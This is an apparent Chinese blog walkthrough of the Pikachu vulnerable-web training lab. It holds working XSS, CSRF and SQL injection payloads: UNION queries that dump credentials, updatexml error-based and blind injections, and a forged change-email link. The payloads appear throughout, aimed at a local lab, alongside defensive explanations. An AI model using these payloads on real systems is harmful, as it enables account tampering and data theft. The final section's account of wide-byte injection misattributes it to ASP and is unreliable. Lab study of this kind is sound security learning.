+<h4 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h4><p>源码给出了提示，源码已有&lt;script …&gt;,因此可以用进行闭合，</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303154506234.png" alt="image-20230303154506234" style="zoom:50%;">
+
+<p><code>&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<p><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230303154803376.png" alt="image-20230303154803376"></p>
+<h2 id="CSRF（跨站请求伪造）-1"><a href="#CSRF（跨站请求伪造）-1" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h2><p>CSRF（Cross-Site Request Forgery）又叫”one click”攻击，是一种网络安全攻击，攻击者利用用户已登录的身份，在受害者不知情的情况下伪造请求，实现对目标网站的攻击。其攻击流程和防御措施如下：</p>
+<p>攻击流程：</p>
+<ol>
+<li>用户登录目标网站并获取到有效的session</li>
+<li>攻击者构造恶意网页或者其他方式欺骗用户访问特定的URL</li>
+<li>目标网站验证session后执行请求，由于请求是在用户身份下发起的，因此无法判断是否是恶意的</li>
+<li>攻击成功，目标网站的数据被篡改或者被删除等</li>
+</ol>
+<p>攻击原理：</p>
+<p>攻击者在用户已登录的情况下，通过伪造请求让目标网站误以为这是合法的请求。由于目标网站在验证请求时只验证了session，而未对请求来源进行验证，因此攻击者可以伪造请求，实现对目标网站的攻击。</p>
+<p>防御措施：</p>
+<ol>
+<li>使用CSRF Token：网站在每个表单中都添加一个随机生成的token，每次提交表单时都需要带上这个token，如果token与服务器上存储的不一致，就会拒绝请求。这样可以有效防止攻击者伪造请求。</li>
+<li>验证Referer头：在服务器端验证HTTP Referer头，检查请求来源是否是本站，如果不是则拒绝请求。</li>
+<li>使用验证码：在关键操作（如修改密码、删除数据等）前要求用户输入验证码，增加攻击者的难度。</li>
+<li>阻止第三方网站的请求：在服务器端禁止第三方网站的请求，只允许本站请求。</li>
+<li>安全设置：在服务器端对数据进行安全设置，如限制表单的请求时间、添加IP地址白名单等。</li>
+</ol>
+<p>【CSRF与XSS的区别】：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，例如通过构造恶意连接，让受害者自己点击执行恶意代码；而XSS是直接盗取到了用户的权限，然后实施破坏。   </p>
+<p>​                 </p>
+<h4 id="CSRF（get）"><a href="#CSRF（get）" class="headerlink" title="CSRF（get）"></a>CSRF（get）</h4><p>【可能遇到的bug】</p>
+<p>报错原因：MYSQL_ASSOC是PHP中MySQL查询函数mysql_fetch_array()中的一个选项，它表示返回的结果集中的数组使用关联索引而不是数字索引。这个选项在PHP 5.5.0版本中被废弃，从PHP 7.0.0版本开始被移除。（CSRF（post）、CSRF token也可能有这问题）</p>
+<p>解决办法：如果使用的是PHP 7.0.0或更高版本，那么可以将代码中的MYSQL_ASSOC替换为MYSQLI_ASSOC，另一个方法就是降低PHP版本</p>
+<p>分析：一般来说，GET请求方式是不安全的，可以在url处看到表单提交情况。可以通过修改表单进行攻击。</p>
+<p><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230304104110401.png" alt="image-20230304104110401"></p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230304104355844.png" alt="image-20230304104355844" style="zoom:50%;">
+
+<p>先登录，登录后点击修改信息（可以留意一下GET请求头）</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230304195712035.png" alt="image-20230304195712035" style="zoom: 33%;">
+
+<p>修改信息，点击“submit”提交并抓包</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230304195856854.png" alt="image-20230304195856854" style="zoom:67%;">
+
+<p>可以发现get请求头，包换了“个人信息”，可以根据该请求头构造恶意链接（例如修改邮箱）</p>
+<p>构造如下链接，只要对方在登录的情况点击连接，把邮箱从222322改为111111：<code>127.0.0.1/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=%E7%94%B7&amp;phonenum=857521&amp;add=%E5%8C%97%E4%BA%AC&amp;email=111111&amp;submit=submit</code></p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230304200233115.png" alt="image-20230304200233115" style="zoom:33%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230304200418652.png" alt="image-20230304200418652" style="zoom:50%;">
+
+
+
+<h4 id="CSRF（post）"><a href="#CSRF（post）" class="headerlink" title="CSRF（post）"></a>CSRF（post）</h4><p>分析：POST请求方式相对安全点，用户没发直接修改请求。不过可以模仿post请求头，自己建表单并与原网站的请求头建立联系，当别人点击伪造连接，也可以到达效果。（所以陌生链接别随便点）</p>
+<p>点击“submit”提交表单并抓包，获取请求头</p>
+<p><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230304202054517.png" alt="image-20230304202054517"></p>
+<p>利用请求头伪造恶意表单和界面</p>
+<p><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230304202220351.png" alt="image-20230304202220351"></p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230304202403980.png" alt="image-20230304202403980" style="zoom:33%;">
+
+<p>把恶意网页文件放在主界面，则恶意链接<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu-master/1.html%EF%BC%9B%E5%8F%AA%E8%A6%81%E5%AF%B9%E6%96%B9%E7%82%B9%E5%87%BB%E4%BA%86%E8%BF%9E%E6%8E%A5%E5%B0%B1%E4%BC%9A%E4%BF%AE%E6%94%B9%E4%BF%A1%E6%81%AF%EF%BC%88%E5%A6%82%E4%BB%A3%E7%A0%81%EF%BC%89">http://127.0.0.1/pikachu-master/1.html；只要对方点击了连接就会修改信息（如代码）</a></p>
+<h4 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h4><p>​        这里增加了Token，当点击修改个人信息的时候，后端代码会生成token，并且发送到前端页面，通过hidden属性隐藏起来，放在表单中。点击submit时，会将从后端发过来的token和提交的数据，以表单的形式一并发送到后端服务器，后端服务器会验证此token；但发生事件，Token值就会发生改变，也就完全防止了GRSF漏洞的产生。</p>
+<p>​    虽然可以抓包劫持请求表单，也可以进行会话劫持攻击，但好似没发通过借用Token值进行伪造而已请求。</p>
+<h2 id="SQL-Inject（SQL注入）"><a href="#SQL-Inject（SQL注入）" class="headerlink" title="SQL-Inject（SQL注入）"></a>SQL-Inject（SQL注入）</h2><p>​        SQL注入（SQL Injection）是一种常见的Web应用程序安全漏洞，攻击者通过恶意构造输入数据，可以让应用程序执行非预期的SQL命令，从而破坏、窃取或修改数据库中的数据。下面将介绍SQL注入的流程、原理以及防御措施。</p>
+<p>【<strong>SQL注入的流程</strong>】</p>
+<p> （0）判断是否存在SQL注入漏洞，类型是什么</p>
+<p>（1）构造恶意输入数据，注入恶意SQL代码； </p>
+<p>（2）将构造好的数据发送到Web应用程序的后台服务器； </p>
+<p>（3）Web应用程序后台服务器将收到的数据作为SQL查询语句的一部分，与其它SQL代码组合后发送给数据库服务器； </p>
+<p>（4）数据库服务器执行恶意SQL代码，将查询结果返回给Web应用程序后台服务器； </p>
+<p>（5）Web应用程序后台服务器将查询结果返回给客户端，攻击者获得了所需的数据。</p>
+<p>【<strong>SQL注入的原理</strong> 】</p>
+<p>（1）SQL语句的拼接问题：Web应用程序在拼接SQL语句时，如果不对用户输入数据进行过滤和验证，将恶意数据拼接到SQL语句中，攻击者可以通过修改原有的SQL语句实现SQL注入攻击。</p>
+<p>（2）数据类型的转换问题：当Web应用程序使用动态语言（如PHP、Python等）处理用户输入时，数据类型转换是很常见的。攻击者可以利用这一特点，在注入语句中通过数据类型转换绕过数据过滤。 </p>
+<p>（3）数据库权限问题：如果数据库用户权限不当，攻击者可以通过SQL注入攻击获得管理员权限，从而对数据库进行恶意操作。</p>
+<p>【<strong>SQL注入的防御措施</strong> 】</p>
+<p>（1）输入过滤和验证：Web应用程序应该对用户输入的数据进行过滤和验证，确保输入数据的合法性。</p>
+<p> （2）使用参数化查询：使用参数化查询可以有效地避免SQL注入攻击，因为参数化查询会将用户输入数据和SQL查询语句分开处理。 </p>
+<p>（3）最小权限原则：在数据库中为应用程序创建专用的用户，并给予最小权限，防止攻击者通过注入攻击获得管理员权限。 </p>
+<p>（4）使用ORM框架：ORM（Object-Relational Mapping）框架可以有效地避免SQL注入攻击，因为ORM框架会自动对输入数据进行过滤和转义。 </p>
+<p>（5）关闭错误输出：关闭错误输出可以有效地避免攻击者利用错误信息进行攻击。 </p>
+<p>（6）定期更新应用程序和数据库：应该定期更新Web应用程序和数据库软件，以确保已知漏洞得到及时修复。</p>
+<p>【<strong>mysql内联字段名</strong>】</p>
+<p>information_schema：Mysql自带的数据库，存放各类数据库相关信息的信息数据库，表多为视图</p>
+<p>information_schema.tables：该数据库下的tables表</p>
+<p>table_schema：tables表下的一个字段，数据库名称</p>
+<p>table_type：tables表下的一个字段，表类型，base table为基础表，注：有空格</p>
+<p>table_name：tables表下的一个字段，数据表名称</p>
+<p>【<strong>判断SQL注入类型</strong>】</p>
+<p>（1)（数字型、字符型）</p>
+<table>
+<thead>
+<tr>
+<th>$id</th>
+<th>数字型（id=$id）</th>
+<th>字符型（id=’$id’）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1   and 1=1</td>
+<td>id=1   and 1=1 返回正常</td>
+<td>id=‘1 and 1=1’返回正常</td>
+</tr>
+<tr>
+<td>1   and 1=2</td>
+<td>id=1   and 1=2 返回错误</td>
+<td>id=‘1 and 1=2’返回正常</td>
+</tr>
+<tr>
+<td>1   or 1=1</td>
+<td>id=   1 or 1=1 返回正常</td>
+<td>id=‘1 or 1=1’返回正常</td>
+</tr>
+<tr>
+<td>1   or 1=2</td>
+<td>id=1   or 1=2 返回正常</td>
+<td>id=‘1 or 1=2’返回正常</td>
+</tr>
+<tr>
+<td>1’</td>
+<td>id=1’   返回错误</td>
+<td>id=‘1”返回错误</td>
+</tr>
+<tr>
+<td>1’–+</td>
+<td>id=1’   –+ 返回错误</td>
+<td>id=‘1’–+”返回正常</td>
+</tr>
+</tbody></table>
+<p>（2）盲注：（布尔盲注）看返回的结果，是否有正确或错误的信息反馈。因为盲注只是让攻击者知道自己的判断是否正确。（时间盲注）一般是注入sleep(x)函数，看响应是否有延时。</p>
+<h4 id="数字型注入-（post）"><a href="#数字型注入-（post）" class="headerlink" title="数字型注入 （post）"></a>数字型注入 （post）</h4><p>这里可以通过抓包，判断存在数字型注入</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305103539969.png" alt="image-20230305103539969" style="zoom: 33%;">
+
+<p>抓包并注入1 or 1=1；条件为真，一般会输入所有查询结果</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305103755196.png" alt="image-20230305103755196" style="zoom: 33%;">
+
+<p>【查询字段数】（联合注入函数union需要知道字段数），上述查询结果已经可以判断字段数为2；当然也可以用order by工具进行判断</p>
+<p>注入order by 2，响应正常</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305104312852.png" alt="image-20230305104312852" style="zoom:33%;">
+
+<p>注入order by 3，报错；则判断字段数为2</p>
+<p><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305104342173.png" alt="image-20230305104342173"></p>
+<p>【查询数据库名】注入：union select 1,database()#</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305104830093.png" alt="image-20230305104830093" style="zoom:50%;">
+
+<p>【查看表名】注入： union select 1,group_concat(table_name) from information_schema.tables where table_schema = ‘pikachu’#<br>这里需要知道数据库名字（pikachu），其他几个变量是数据库内联变量名（如information_schema）</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305105319417.png" alt="image-20230305105319417" style="zoom: 50%;">
+
+<p>【查看字段名】注入：union select 1 , group_concat(column_name) from information_schema.columns where table_name = ‘users’#（需知道表名）</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305105542257.png" alt="image-20230305105542257" style="zoom:50%;">
+
+<p>【获取用户名和密码】注入：union select username,password from users#（需要知道字段名）</p>
+<p><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305105850438.png" alt="image-20230305105850438"></p>
+<p>e10adc3949ba59abbe56e057f20f883e一看就很像MD5</p>
+<p>加密格式的密文，在线解密得到明文（在线解密网站<a target="_blank" rel="noopener" href="https://www.cmd5.com/%EF%BC%89">https://www.cmd5.com/）</a></p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305110032538.png" alt="image-20230305110032538" style="zoom: 50%;">
+
+<p>注意：结尾的“#”是注释符合，整数型注入有时候是可以不加（这里可以不加），一般字符型注入是要加的。</p>
+<h4 id="字符型注入-get"><a href="#字符型注入-get" class="headerlink" title="字符型注入(get)"></a>字符型注入(get)</h4><p>注入‘1 and 1=2’，响应正常，判断存在字符型注入</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305110430727.png" alt="image-20230305110430727" style="zoom: 50%;">
+
+<p>这里是get请求策略，就可以不用抓包，直接在输入框或者url进行sql注入。</p>
+<p>注入方法与整数型大同小异，只是要注意要用字符类型去查询会比较不容易出错。查询好字段后就可以进行union联合注入查询了</p>
+<p>如【查询数据库和用户名】</p>
+<p>注入：1’ union select database(),user()#</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305111249242-16779859703263.png" alt="image-20230305111249242" style="zoom:50%;">
+
+
+
+<h4 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h4><p>​        搜索型注入可以算字符型的一类。判断是否存在搜索型注入中，如果存在额外的%符号，可以通过以下几种方式进行判断：</p>
+<ol>
+<li>观察URL参数中的变化，如果URL参数中的值包含额外的%符号，那么很可能存在搜索型注入攻击。</li>
+<li>利用注入工具进行测试，将攻击载荷注入到URL参数中，如果服务器返回的结果与正常结果不一致，那么可以判断存在搜索型注入攻击。</li>
+<li>分析Web应用程序的日志，查看是否有异常的请求，如存在包含额外的%符号的请求，就可以判断存在搜索型注入攻击。</li>
+</ol>
+<p>总之，如果存在搜索型注入攻击，往往会表现为Web应用程序返回的结果异常或不符合预期，因此需要结合具体情况进行判断。同时，建议在编写Web应用程序时，充分考虑输入参数的合法性，并严格过滤和验证用户输入，以防止注入攻击的发生。</p>
+<p>“%”是任意字符的意思，这里可以使用“部分搜索”，就代表了存在%（用%去匹配），其一般sql语句会如下（以查询语句为例）：</p>
+<p><code>select from 表名 where username like &#39;%k%&#39;;</code></p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305112638764.png" alt="image-20230305112638764" style="zoom: 50%;">
+
+<p>注入：v%’ or 1=1#</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305113135364.png" alt="image-20230305113135364" style="zoom:50%;">
+
+<p>如果知道有v的用户名，不带%也可以，例如注入：v’ or 1=1#</p>
+<p><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305113246306.png" alt="image-20230305113246306"></p>
+<h4 id="XX型注入"><a href="#XX型注入" class="headerlink" title="XX型注入"></a>XX型注入</h4><p>查看源码</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305162929719.png" alt="image-20230305162929719" style="zoom:50%;">
+
+<p><code>根据select id,email from member where username=(&#39;$name&#39;);</code> 构造闭合即可。</p>
+<p>例如：注入：x’) or 1=1#</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305163212419.png" alt="image-20230305163212419" style="zoom:50%;">
+
+<p>注入：x’) union select username,password from users#</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305163305240.png" alt="image-20230305163305240" style="zoom:50%;">
+
+<p>想要获得其他信息类似构造闭合即可</p>
+<h4 id="“insert-update”注入"><a href="#“insert-update”注入" class="headerlink" title="“insert/update”注入"></a>“insert/update”注入</h4><p><strong>【知识补充】</strong></p>
+<p> 基于报错的信息获取：(select/delete/update/insert)</p>
+<p><strong>技巧思路</strong>：在mysql中使用一些指定的函数来制造报错，从而从报错信息中获取设定的信息。（后台没有屏蔽数据库报错信息，在语法发生错误时回输出在前端。）select/insert/update/delete都可以使用报错来获取信息。</p>
+<p><strong>三个常用的用来报错的函数</strong></p>
+<ul>
+<li>updatexml():函数是MySQL对XML文档数据进行查询和修改的XPATH函数。</li>
+<li>extractvalue():函数也是MySQL对XML文档数据进行查询和修改的XPATH函数。</li>
+<li>floor():MYSQL中用来取整的函数。</li>
+</ul>
+<p>例子：<br>        select updatexml(“abc”,”//div/p/text()”,”abcd”)   的意思是把”abc”换成”abcd” ，而服务器要通过xpath路径”//div/p/text()”找到”abc”  。这时如果xpath路径格式出错了，则会把校验xpath路径后的结果通过报错信息显示出来，如果我们把xpath路径改成我们想知道的信息，结果就会通过报错信息显示出来。</p>
+<p>例如改成<strong>select updatexml(“abc”,concat(“~”,database()),”abcd”)</strong>  就可以通过报错信息得到当前服务器使用数据库的名字。<strong>concat()函数</strong>的作用是把“<del>”和database()执行后的结果拼接起来，使用concat()的目的是为了让xpath路格式出错，因为xpath路径格式中没</del>,出错后就会让语句执行后的结果通过报错显示出来。</p>
+<p>【<strong>insert注入</strong>】</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305171754531.png" style="zoom:50%;">
+
+<p>查看源码，构造注入语句</p>
+<p>【获取数据库名字】到注册界面，在用户名处注入：x’ or updatexml(1,concat(0,database()),0) or ‘</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305165831215.png" alt="image-20230305165831215" style="zoom:50%;">
+
+<p>【补充】（1）这里updatexml(1,concat(0,database()),0) 第一个参数是1，最后一个是0，是根据列的内容数据类型来定的（可以试数字或字符）。得到想要的信息，把database做替换为别的注入语句。</p>
+<p>（2）结尾是or ’，是因为insert语句是插入多个数据的（用户、密码、性别…），or ’表示后面都为空。</p>
+<p>【<strong>update注入</strong>】</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305171925790.png" alt="image-20230305171925790" style="zoom:50%;">
+
+<p>一样注入x’ or updatexml(1,concat(0,database()),0) or ‘</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305171514315.png" alt="image-20230305171514315" style="zoom:50%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230305171825650.png" alt="image-20230305171825650" style="zoom:50%;">
+
+
+
+<h4 id="”delete“注入"><a href="#”delete“注入" class="headerlink" title="”delete“注入"></a>”delete“注入</h4><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230306170031589.png" alt="image-20230306170031589" style="zoom: 80%;">
+
+<p>删除留言并抓包，将请求数据，右键点击“send to Repeater”</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230306154556090.png" alt="image-20230306154556090" style="zoom: 33%;">
+
+<p>构造payload：1 or updatexml(1,concat(0x7e,database()),0)</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230306151855343.png" alt="image-20230306151855343" style="zoom:33%;">
+
+<p>编码</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230306164534182.png" alt="image-20230306164534182" style="zoom:33%;">
+
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230306164603189.png" alt="image-20230306164603189" style="zoom: 50%;">
+
+<p>点击send，即可得到结果</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230306164801143.png" alt="image-20230306164801143" style="zoom: 33%;">
+
+
+
+<h4 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h4><p>源码</p>
+<p><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230307101230769.png" alt="image-20230307101230769"></p>
+<p>【代码审计】用正确的账号和密码进行登陆，发现有post和get请求策略，post处理在服务器，而get请求在前段；由源码可知是直接传http头的信息到数据库，于是便从get请求下手。</p>
+<p>看到它把请求头信息插入到数据库中，而且是字符型，可以使用刚刚的insert注入；回到刚刚登录的页面，登录抓包，修改http头。第一个post包不作修改，直接放掉。</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230307103555687.png" alt="image-20230307103555687" style="zoom:67%;">
+
+<p>抓取第二个包，是get包，在User-Agent注入：’ or updatexml(1,concat(1,database()),1) or ‘</p>
+<p>concat第一个参数1不是非得1，也可以字符，如0x7e；这里好像没限制</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230307103907524.png" alt="image-20230307103907524" style="zoom:67%;">
+
+<p>修改后再放包，就会在报错处获取到想要的信息。</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230307103136354.png" alt="image-20230307103136354" style="zoom:50%;">
+
+
+
+<h4 id="盲注（base-on-boolian）"><a href="#盲注（base-on-boolian）" class="headerlink" title="盲注（base on boolian）"></a>盲注（base on boolian）</h4><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230307105822824.png" alt="image-20230307105822824" style="zoom: 50%;">
+
+<p>【代码审计】可以看到结果只有两个，一个输出正确信息，一个输出username不存在，mysqi_query不打印错误描述，所以不能使用报错注入。mysqli_num_rows($result)==1</p>
+<p>这里用ascii()函数和substr()作为工具（不唯一），ascii(x)返回x的ASCII码，substr(string，start，num)函数从string的第start个字符开始，共取num个。</p>
+<p>注入：’ or ascii(substr(database(),1,1))= 111 limit 0,1 #，结果报错</p>
+<p>这里的111，一般是从0一步步试过来的，这就是布尔盲注的麻烦之处。这里加limit 0,1 表示只读取第一条记录，如果ascii函数=x为真，则会查询所有记录，所以加limit才能满足源码的if条件。</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230307110140770.png" alt="image-20230307110140770" style="zoom: 67%;">
+
+<p>注入： ‘ or ascii(substr(database(),1,1))= 112 limit 0,1 #</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230307111350905.png" alt="image-20230307111350905" style="zoom:67%;">
+
+<p>由上面可知ascii值为112(字母p的10进制ascii值，数据库名字pikachu)的字符为当前数据库的第一个字母</p>
+<p>【注意】这里除了布尔盲注，还可以进行其他qsl注入，如联合注入；</p>
+<p>例如查看表名，注入：1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema = ‘pikachu’#</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230307111845468.png" alt="image-20230307111845468" style="zoom:67%;">
+
+
+
+<h4 id="盲注（base-on-time）"><a href="#盲注（base-on-time）" class="headerlink" title="盲注（base on time）"></a>盲注（base on time）</h4><img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230307112103598.png" alt="image-20230307112103598" style="zoom: 50%;">
+
+<p>【代码审计】正确错误回显都一样，只能使用时间盲注</p>
+<p>判断是否存在时间盲注：注入：1’ or sleep(5)#</p>
+<p>可以看到网页在延时加载，不出意外是加载5秒</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230307112606532.png" alt="image-20230307112606532" style="zoom:67%;">
+
+<p>界面正常响应，就说明存在时间盲注漏洞</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230307113114473.png" alt="image-20230307113114473" style="zoom:50%;">
+
+
+
+<p>注入： ‘ or ascii(substr(database(),sleep(2),1))= 112 limit 0,1 #</p>
+<img src="/2023/08/01/Pichaku%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0-%E4%B8%8A/image-20230307113400780.png" alt="image-20230307113400780" style="zoom:67%;">
+
+<p>盲注一般只能知道自己的操作（这里是判断）是否正确，上面结果与布尔盲注效果一样。</p>
+<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>​        宽字节注入（Wide-Character Injection），是一种针对ASP程序开发的攻击方式，该攻击利用了ASP解释器对双字节字符的处理不一致，通过输入特定的双字节字符来使得ASP程序解释器解释出错，从而导致安全漏洞的产生。</p>
+<p>​        宽字节注入的攻击方式与SQL注入类似，攻击者利用网站表单或URL参数传递恶意的特殊字符，让应用程序误认为是合法的输入，从而绕过输入验证过程，进而执行攻击者自己编写的SQL语句，达到控制数据库的目的。</p>
+<p>【宽字节注入攻击的原理】利用ASP解释器对Unicode编码的字符的不同处理方式。ASP程序默认使用的是Unicode编码，也就是采用双字节来表示一个字符。由于不同语言的双字节字符的表示方式不同，例如中文使用的双字节编码是gb2312或utf-8，而英文则使用ASCII码表示，所以ASP程序会将输入的字符转换成相应的Unicode编码。</p>
